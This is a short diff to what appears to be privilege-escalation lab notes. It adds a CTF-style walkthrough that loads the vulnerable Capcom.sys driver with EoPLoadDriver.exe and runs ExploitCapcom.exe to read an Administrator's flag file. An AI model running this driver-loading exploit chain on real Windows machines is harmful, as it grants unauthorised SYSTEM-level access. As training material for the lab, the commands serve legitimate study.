@@ -203,3 +203,13 @@ EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
 ```cmd
 reg delete HKCU\System\CurrentControlSet\Capcom
 ```
+### Walkthrough
+```
+cd C:\Tools
+EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+
+cd ExploitCapcom
+ExploitCapcom.exe
+
+type C:\Users\Administrator\Desktop\flag.txt
+```
